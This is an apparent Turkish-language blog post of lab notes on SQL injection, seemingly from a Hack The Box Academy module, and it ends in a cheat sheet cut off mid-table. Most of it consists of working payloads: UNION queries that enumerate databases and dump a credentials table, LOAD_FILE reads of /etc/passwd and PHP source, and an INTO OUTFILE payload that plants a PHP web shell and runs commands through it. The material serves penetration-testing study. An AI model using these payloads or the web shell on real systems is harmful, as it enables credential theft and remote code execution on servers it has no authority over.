+<h1 id="Database-Enumeration"><a href="#Database-Enumeration" class="headerlink" title="Database Enumeration"></a>Database Enumeration</h1><p>Bir database ile uğraşırken onun hangi tür ve hangi versiyonda olduğunu bilemeyebiliriz. Bunu anlayabilmek açısından ve hatta MySQL mi değil mi bunu tespit edebilmek açısından aşağıdaki tablodaki bazı denemeleri yapmak faydalı olabilir:</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>When to Use</th>
+<th>Expected Output</th>
+<th>Wrong Output</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SELECT @@version</td>
+<td>When we have full query output</td>
+<td>MySQL Version ‘i.e. 10.3.22-MariaDB-1ubuntu1’</td>
+<td>In MSSQL it returns MSSQL version. Error with other DBMS.</td>
+</tr>
+<tr>
+<td>SELECT POW(1,1)</td>
+<td>When we only have numeric output</td>
+<td>1</td>
+<td>Error with other DBMS</td>
+</tr>
+<tr>
+<td>SELECT SLEEP(5)</td>
+<td>Blind&#x2F;No Output</td>
+<td>Delays page response for 5 seconds and returns 0.</td>
+<td>Will not delay response with other DBMS</td>
+</tr>
+</tbody></table>
+<p>Örneğin <code>@@version</code> şeklinde bir deneme yaparsak şu şekilde bir sonuca erişeceğimizi tekrardan hatırlayalım:</p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%206.png" alt="Untitled"></p>
+<h2 id="INFORMATION-SCHEMA-Database"><a href="#INFORMATION-SCHEMA-Database" class="headerlink" title="INFORMATION_SCHEMA Database"></a><strong><strong>INFORMATION_SCHEMA Database</strong></strong></h2><p>Şimdi benim bilgi döndürebilmem için veri tabanı listesine, o veritabanındaki tablolara ve o tablolardaki sütunlara ihtiyacım var ki spesifik olarak istediğim verileri çekebileyim. Peki ben bu bilgileri nereden edineceğim?</p>
+<p>INFORMATION_SCHEMA veri tabanı bunun için biçilmiş bir kaftandır. Burada tüm server içerisinde bulunan veri tabanı, tablo ve sütunların meta dataları bulunur. Biraz farklı bir veri tabanıdır. Direkt SELECT kullanarak tabloları çağrılabilir cinsten değildir. Örneğin, <code>my_database</code> veri tabanından <code>users</code> tablosunu çekmek için:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> my_database.users;</span><br></pre></td></tr></table></figure>
+
+<p>Arada bağlantı kurmak için nokta işareti <code>(.)</code> kullanılır.</p>
+<h3 id="Guzel-Kardesim-Bu-Server-Uzerinde-Hangi-Veri-Tabanlari-Var"><a href="#Guzel-Kardesim-Bu-Server-Uzerinde-Hangi-Veri-Tabanlari-Var" class="headerlink" title="Güzel Kardeşim Bu Server Üzerinde Hangi Veri Tabanları Var?"></a>Güzel Kardeşim Bu Server Üzerinde Hangi Veri Tabanları Var?</h3><p>INFORMATION_SCHEMA veritabanındaki <code>SCHEMATA</code>, sunucudaki tüm veritabanları hakkında bilgi içerir. Veritabanı adlarını almak için kullanılır, böylece onları sorgulayabiliriz. SCHEMA_NAME sütunu, şu anda mevcut olan tüm veritabanı adlarını içerir.</p>
+<p><strong>Örnek olarak:</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+--------------------+</span><br><span class="line">| SCHEMA_NAME        |</span><br><span class="line">+--------------------+</span><br><span class="line">| mysql              |</span><br><span class="line">| information_schema |</span><br><span class="line">| performance_schema |</span><br><span class="line">| ilfreight          |</span><br><span class="line">| dev                |</span><br><span class="line">+--------------------+</span><br></pre></td></tr></table></figure>
+
+<p>En üstteki ilk üç veri tabanı standart-default veri tabanlarıdır ve her veri tabanı serverları üzerinde bulunur. Burada yaptğımız sorgu sonucu biz ilfreight ve dev adında iki adet veri tabanına sahip olduğumuzu görüyoruz.</p>
+<p>Şimdi aynı işlemi bir de UNION kullanarak sql injection açığına sahip kurban üzerinde gerçekleştirelim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%207.png" alt="Untitled"></p>
+<p>Yukarıda port arama çubuğu verilerini belirli bir veri tabanından almakta. Acaba dev mi yoksa ilfreight veri tabanından mı alıyor bunları? Bunu öğrenmek için <code>database()</code> sorgusunu kullanırız.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1,database(),2,3-- -</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%208.png" alt="Untitled"></p>
+<p>Bu şekilde port’ların nerede tutulduğunu anlamış olduk. O zaman teknik bilgi ilfreight veri tabanındaysa özel bilgiler (yani kullanıcı adı-şifre gibi gizli kalması gereken bilgiler) dev veri tabanında içerisinde mi? Bu durum ilgimizi çekmekte olduğu için biraz inceleme yapacağız.</p>
+<h2 id="Tablolar-1"><a href="#Tablolar-1" class="headerlink" title="Tablolar"></a>Tablolar</h2><p>Dev veri tabanını patlatmadan önce içerisindeki işleyişten haberdar olmamız önemlidir. Bu sebepten hareketle ilk önce içerisindeki tabloları öğrenmeliyiz. Bu bilgileri INFORMATION_SCHEMA üzerindeki <code>TABLES</code> tablosundaki sütunlar üzerinden çekeceğimizi de unutmamak lazım. Bizim şu an için işime yarayacak iki tane sütun vardır. Bunlardan ilki <code>TABLE_NAME</code> sütunudur. Görevi tablo isimlerini saklamaktır. İkincisi ise <code>TABLE_SCHEMA</code> sütunudur. Bu sütun her tablonun ait olduğu veritabanına işaret eder.</p>
+<p>Şimdi bu bilgileri kullanarak istediğimiz verileri çekelim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#x27;</span>dev<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure>
+
+<div class="note info flat"><p>🌐 <strong>Note:</strong> We added a (where table_schema&#x3D;’dev’) condition to only return tables from the ‘dev’ database, otherwise we would get all tables in all databases, which can be many.</p>
+</div>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%209.png" alt="Untitled"></p>
+<p>Burada dört adet tablo elde etmiş olduk. Muhtemelen içerisinde hassas bilgiler barındıran <code>credentials</code> tablosu olacaktır. </p>
+<h2 id="Sutunlar"><a href="#Sutunlar" class="headerlink" title="Sütunlar"></a>Sütunlar</h2><p>Tablo bilgisini elde ettiğimize göre şimdi tablo içerisindeki sütunlardan haberdar olalım ki içerisinden veri çekebilelim. Sütun bilgileri <code>INFORMATION_SCHEMA</code> içerisinde <code>COLUMNS</code> tablosunda bulunur. COLUMNS tablosu, tüm veritabanlarında bulunan tüm sütunlar hakkında bilgi içerir. Daha önce yaptığımız gibi, kimlik bilgileri tablosundaki sütun adlarını bulmak için bu payload’ı deneyelim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&quot;credentials&quot;-- </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2010.png" alt="Untitled"></p>
+<p>Tablonun iki adet username ve password adlarında sütunlara sahip olduğunu gördük. Bu bilgileri verileri patlatmak için kullanabiliriz.</p>
+<h2 id="Data"><a href="#Data" class="headerlink" title="Data"></a><strong><strong>Data</strong></strong></h2><p>Şimdi en son geriye verileri çekmek kaldı. Bunun için şu sorguyu kullanalım:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION select 1, username, password, 4 from dev.credentials-- -</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2011.png" alt="Untitled"></p>
+<hr>
+<h1 id="Dosya-Okuma"><a href="#Dosya-Okuma" class="headerlink" title="Dosya Okuma"></a>Dosya Okuma</h1><p>Belirli faaliyetleri gerçekleştirip gerçekleştiremeyeceğimizi öğrenmek için öncelikle veri tabanındaki hangi kullanıcıyı kullanıyor olduğumuzu bilmek önemlidir. Bunun için <code>user</code> ya da <code>user()</code> fonksiyonlarından yararlanabiliriz.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION SELECT 1, user(), 3, 4-- -</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2012.png" alt="Untitled"></p>
+<p>Root olduğumuz cevabı döndü.</p>
+<h2 id="Peki-Su-Anda-Bulundugumuz-Kullanici-Hangi-Ayricaliklara-Sahip"><a href="#Peki-Su-Anda-Bulundugumuz-Kullanici-Hangi-Ayricaliklara-Sahip" class="headerlink" title="Peki Şu Anda Bulunduğumuz Kullanıcı Hangi Ayrıcalıklara Sahip?"></a>Peki Şu Anda Bulunduğumuz Kullanıcı Hangi Ayrıcalıklara Sahip?</h2><p>Öncelikle biz super admin yetkinliklerine sahip miyiz bir ona bakalım. Bunun için <code>super_priv</code> parametresini kullanacağız. Basit haliyle:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> super_priv <span class="keyword">FROM</span> mysql.user</span><br></pre></td></tr></table></figure>
+
+<p>Şu anki durumumuza göre uyarlarsak eğer:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=&quot;root&quot;-- </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2013.png" alt="Untitled"></p>
+<p>Sorgu sonucu olarak en solda görülebileceği üzere <code>Y</code> harfi döndü yani bu <code>YES</code> demektir. Peki detaylı olarak hangi komutlara erişimimiz var? Bunu görmek için basitçe şu sorguyu kullanacağız:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> sql_grants <span class="keyword">FROM</span> information_schema.sql_show_grants</span><br></pre></td></tr></table></figure>
+
+<p>Kendi durumumuza uyarlarsak:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- </span></span><br></pre></td></tr></table></figure>
+
+<p>Burada <code>grantee</code> o ayrıcalığa sahip olan kişi, <code>privilege_type</code> ise sahip olunan ayrıcalığın kendisidir.</p>
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2014.png" alt="Untitled"></p>
+<p>Root kullanıcısı için <code>FILE</code> ayrıcalığının listelendiğini görüyoruz. Bu okumamızı ve hatta potansiyel olarak dosyaya yazmamızı sağlamaktadır. </p>
+<h2 id="LOAD-FILE"><a href="#LOAD-FILE" class="headerlink" title="LOAD_FILE"></a><strong><strong>LOAD_FILE</strong></strong></h2><p><code>LOAD_FILE()</code> fonksiyonu,  MariaDB &#x2F; MySQL’de dosyalardan veri okumak için kullanılabilir. Fonksiyon tek bir argüman kabul etmektedir ve bu okuyacağı dosyanın kendidir. Örneğin &#x2F;etc&#x2F;passwd dosyasını okumak istediğimizi düşünelim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Şimdi durumu kendimize göre ayarlarsak:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2015.png" alt="Untitled"></p>
+<h3 id="Peki-Kaynak-Kod-Sizdirilabilir-Mi"><a href="#Peki-Kaynak-Kod-Sizdirilabilir-Mi" class="headerlink" title="Peki Kaynak Kod Sızdırılabilir Mi?"></a>Peki Kaynak Kod Sızdırılabilir Mi?</h3><p>Şuan search.php sayfasında olduğumuzu biliyoruz. Varsayılan olarak apache’nin webroot’u ise &#x2F;var&#x2F;www&#x2F;html dizinidir. O zaman tek yapmamız gereken bu dizin içerisindeki search.php dosyasını LOAD_FILE ile çağırmaktır:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION SELECT 1, LOAD_FILE(&quot;/var/www/html/search.php&quot;), 3, 4-- </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2016.png" alt="Untitled"></p>
+<p>Tablo içerisinde sayfanın yeniden oluşturulduğunu görebiliriz. <code>CTRL + U</code> ile sayfanın kaynak kodlarına bakalım:</p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2017.png" alt="Untitled"></p>
+<p>Bu sayede normalde görünmez olan php kodlarına eriştik. Bu durum bize daha fazla açıklık bulma açısından ilham verebilir.</p>
+<hr>
+<h1 id="Writing-Files"><a href="#Writing-Files" class="headerlink" title="Writing Files"></a>Writing Files</h1><p>Dosyalara yazabilmek için hangi şartların sağlanması lazım?</p>
+<ul>
+<li>Kullanıcının <code>FILE</code> imtiyazının olması</li>
+<li>MySQL global <code>secure_file_priv</code> değişkenin etkinleştirilmemiş olması</li>
+<li>Back-end sunucuya erişimimizin olması</li>
+</ul>
+<p>gerekmektedir.</p>
+<p>Daha önceki yaptığımız örneği ele alırsak bizim <code>FILE</code> imtiyazımız da var sunucuya erişimimiz de.  zaman geriye <code>secure_file_priv</code> değişkeninin durumunu kontrol etmek kalıyor. </p>
+<p>Secure_file_priv değişkeni, dosyaların nereden okunacağını&#x2F;yazılacağını belirlemek için kullanılır. Boş bir değer, tüm dosya sisteminden dosyaları okumamızı sağlar. Aksi takdirde, belirli bir dizin ayarlanmışsa, yalnızca değişken tarafından belirtilen klasörden okuyabiliriz. Öte yandan, NULL, herhangi bir dizinden okuyamayacağımız&#x2F;yazamayacağımız anlamına gelir. MariaDB bu değişkeni varsayılan olarak boş olarak ayarlamıştır; bu durum, kullanıcının FILE ayrıcalığına sahip olması durumunda herhangi bir dosyayı okumamıza&#x2F;yazmamıza olanak tanır.</p>
+<p>Ancak MySQL, varsayılan klasör olarak &#x2F;var&#x2F;lib&#x2F;mysql-files kullanır. Bu, dosyaları MySQL enjeksiyonu yoluyla okumanın varsayılan ayarlarla mümkün olmadığı anlamına gelir. Daha da kötüsü, bazı modern konfigürasyonlar varsayılan olarak NULL’dur, bu da sistemin herhangi bir yerinde dosyaları okuyamayacağımız&#x2F;yazamayacağımız anlamına gelir.</p>
+<p>O zaman şimdi bu secure_file_priv değişkenini nasıl bulacağıma geçelim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;secure_file_priv&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Biz UNION injection ile ilgilendiğimiz için kendimizi bu duruma göre ayarlayalım. Peki o zaman SELECT işlemini nereden gerçekleştireceğiz?</strong></p>
+<p>MySQL global değişkenleri INFORMATION_SCHEMA veri tabanı altındaki <code>global_variables</code> tablosunda tutulur. Bu tablonun <code>variable_name</code> ve <code>variable_value</code> olmak üzere iki sütunu vardır. O zaman şu şekilde bir sorgu yazabiliriz:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> variable_name, variable_value <span class="keyword">FROM</span> information_schema.global_variables <span class="keyword">where</span> variable_name<span class="operator">=</span>&quot;secure_file_priv&quot;</span><br></pre></td></tr></table></figure>
+
+<p>Kendi dört sütunlu tablomuza bu sorguyu uyarlarsak eğer:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2018.png" alt="Untitled"></p>
+<p>Görüldüğü üzere değeri boştur. Yani biz herhangi bir yerde dosyayı istediğimiz gibi okuyup yazabiliriz.</p>
+<h2 id="SELECT-INTO-OUTFILE"><a href="#SELECT-INTO-OUTFILE" class="headerlink" title="SELECT INTO OUTFILE"></a><strong><strong>SELECT INTO OUTFILE</strong></strong></h2><p>Bu kısım dosyalara yazma yapacağımız yerin aslıdır. Burada inceleyeceğimiz iki olay var, ilkinde direkt olarak export mantığı var ve diğerinde ise paralel şekilde dosyaya yazı yazmak var. Şimdi inceleyelim.</p>
+<p>Sorgu sonucunu bir dosyaya yazmak için INTO OUTFILE komutlarını kullanıyoruz. Bu komutlardan sonra da dizinimizi belirtiyoruz:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/credentials&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Şimdi <code>/tmp/credentials</code> dosya yolunun anlamı <code>/tmp/</code> dizini içerisine <code>credentials</code> adında bir dosya aç demektir. Biz kısaca bu sorguda users dosyasındaki tüm sonuçları al ve tmp dizini içerisine credentials dosyası oluşturarak bu dosyanın içerisine bu sorgu sonucunu yapıştır demektir. Dosyayı okuduğumuz zaman bu sorgu sonuçlarına erişebiliriz:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /tmp/credentials</span><br><span class="line"></span><br><span class="line">1       admin   392037dbba51f692776d6cefb6dd546d</span><br><span class="line">2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f</span><br></pre></td></tr></table></figure>
+
+<p>SELECT komutunu kullanarak yazı da yazabiliriz. Örneğin:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">&#x27;this is a test&#x27;</span> INTO OUTFILE <span class="string">&#x27;/tmp/test.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>Yukarıda görüldüğü üzere SELECT komutundan sonra yazmak istediğimiz string’i yazarız ve ardından INTO OUTFILE ile dizini belirtiriz. Dosyayı okuduğumuz zaman görüntü şu şekildedir:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /tmp/test.txt </span><br><span class="line"></span><br><span class="line">this is a <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>Dosya izinlerini kontrol edelim:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /tmp/test.txt </span><br><span class="line"></span><br><span class="line">-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt</span><br></pre></td></tr></table></figure>
+
+<p>Yukarıda gördüğümüz gibi test.txt dosyası başarıyla oluşturulmuştur ve mysql kullanıcısına aittir.</p>
+<h3 id="Bu-Bilgiler-Dogrultusunda-Web-Shell-Yazmak"><a href="#Bu-Bilgiler-Dogrultusunda-Web-Shell-Yazmak" class="headerlink" title="Bu Bilgiler Doğrultusunda Web Shell Yazmak"></a>Bu Bilgiler Doğrultusunda Web Shell Yazmak</h3><p>Önce dosya yazılıyor mu yazılmıyor mu bir kontrol edelim:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">&#x27;file written successfully!&#x27;</span> into outfile <span class="string">&#x27;/var/www/html/proof.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<div class="note info flat"><p>🌐 <strong>Note:</strong> To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use <code>load_file</code> to read the server configuration, like Apache’s configuration found at <code>/etc/apache2/apache2.conf</code>, Nginx’s configuration at <code>/etc/nginx/nginx.conf</code>, or IIS configuration at <code>%WinDir%\System32\Inetsrv\Config\ApplicationHost.config</code>, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">this wordlist for Linux</a> or <a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">this wordlist for Windows</a>. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.</p>
+</div>
+
+<p>Bu sorguyu kendi durumumuza göre UNION injection’a çevirirsek:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; union select 1,&#x27;</span>file written successfully<span class="operator">!</span><span class="string">&#x27;,3,4 into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>proof.txt<span class="string">&#x27;-- </span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2019.png" alt="Untitled"></p>
+<p>Sorgu sonucunda herhangi bir hata görmüyoruz ki bu da başarılı olduk demektir. Webroot üzerinden proof.txt dosyasını kontrol edelim ve başarımızı görüntüleyelim:</p>
+<p><code>http://SERVER_IP:PORT/proof.txt</code></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2020.png" alt="Untitled"></p>
+<p>Yazma izinlerimizi onayladık. Yani webroot içerisine istediğimiz gibi yazıp çizebiliyoruz. O zaman bu webroot içerisine bir webshell atma vakti geldi demektir! Back-end tarafta komutlarımızı çalıştırmak için şu şekilde kısacık bir php webshell’i yazalım:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**<span class="meta">&lt;?php</span>** <span class="title function_ invoke__">system</span>(<span class="variable">$_REQUEST</span>[<span class="number">0</span>]); **<span class="meta">?&gt;</span>**</span><br></pre></td></tr></table></figure>
+
+<p>Önceki UNION injection payloadımızı yeniden kullanabiliriz, “file written successfully” kısmını da yukarıdaki php koduyla değiştirelim ve dosyanın adını da shell.php olarak değiştirip kaydedelim:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; union select &quot;&quot;,&#x27;</span><span class="operator">&lt;</span>?php <span class="keyword">system</span>($_REQUEST[<span class="number">0</span>]); ?<span class="operator">&gt;</span><span class="string">&#x27;, &quot;&quot;, &quot;&quot; into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;-- -</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Sonuç:</strong></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2021.png" alt="Untitled"></p>
+<p>Sonuç olarak yine herhangi bir hata görmedik ve bu işlemin başarıyla gerçekleştiği manasına geliyor.  Bu durumun gerçekleştiğini doğrulamak için de <code>/shell.php</code> dosyasına <code>?0=id</code> parametresi ile gideriz:</p>
+<p><code>http://SERVER_IP:PORT/shell.php?0=id</code></p>
+<p><img src="/img/content-images/htb-academy/SQL%20Injection%20c510aeb3d784484082c63561f0253a29/Untitled%2022.png" alt="Untitled"></p>
+<p><code>id</code> komutunun çıktısı, kod yürütmemiz (code execution) olduğunu ve www-data kullanıcısı olarak çalıştığımızı onaylar.</p>
+<hr>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cn<span class="string">&#x27; union select &quot;&quot;,&#x27;</span><span class="operator">&lt;</span>?php <span class="keyword">system</span>(&quot;dir /var/www&quot;); ?<span class="operator">&gt;</span><span class="string">&#x27;, &quot;&quot;, &quot;&quot; into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell2.php<span class="string">&#x27;-- -</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="SQL-Injection-Cheat-Sheet"><a href="#SQL-Injection-Cheat-Sheet" class="headerlink" title="SQL Injection Cheat Sheet"></a>SQL Injection Cheat Sheet</h1><table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Auth Bypass</td>
+<td></td>
+</tr>
+<tr>
+<td>admin’ or ‘1’&#x3D;’1</td>
+<td>Basic Auth Bypass</td>
+</tr>
+<tr>
+<td>admin’)– -</td>
+<td>Basic Auth Bypass With comments</td>
+</tr>
+<tr>
+<td>Auth Bypass Payloads</td>
+<td></td>
+</tr>
+<tr>
+<td>Union Injection</td>
+<td></td>
+</tr>
+<tr>
+<td>‘ order by 1– -</td>
+<td>Detect number of columns using order by</td>
+</tr>
+<tr>
+<td>cn’ UNION select 1,2,3– -</td>
+<td>Detect number of columns using Union injection</td>
+</tr>
+<tr>
+<td>cn’ UNION select 1,@@version,3,4– -</td>
+<td>Basic Union injection</td>
+</tr>
+<tr>
+<td>UNION select username, 2, 3, 4 from passwords– -</td>
+<td>Union injection for 4 columns</td>
+</tr>
+<tr>
+<td>DB Enumeration</td>
+<td></td>
+</tr>
+<tr>
+<td>SELECT @@version</td>
+<td>Fingerprint MySQL with query output</td>
+</tr>
+<tr>
+<td>SELECT SLEEP(5)</td>
+<td>Fingerprint MySQL with no output</td>
+</tr>
+<tr>
+<td>cn’ UNION select 1,database(),2,3– -</td>
+<td>Current database name</td>
+</tr>
+<tr>
+<td>cn’ UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA– -</td>
+<td>List all databases</td>
+</tr>
+<tr>
+<td>cn’ UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema&#x3D;’dev’– -</td>
+<td>List all tables in a specific database</td>
+</tr>
+<tr>
+<td>cn’ UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name&#x3D;’credentials’– -</td>
+<td>List all columns in a specific table</td>
+</tr>
+<tr>
+<td>cn’ UNION select 1, username, password, 4 from dev.credentials– -</td>
+<td>Dump data from a table in another database</td>
+</tr>
+<tr>
+<td>Privileges</td>
+<td></td>
+</tr>
+<tr>
+<td>cn’ UNION SELECT 1, user(), 3, 4– -</td>
+<td>Find current user</td>
+</tr>
+<tr>
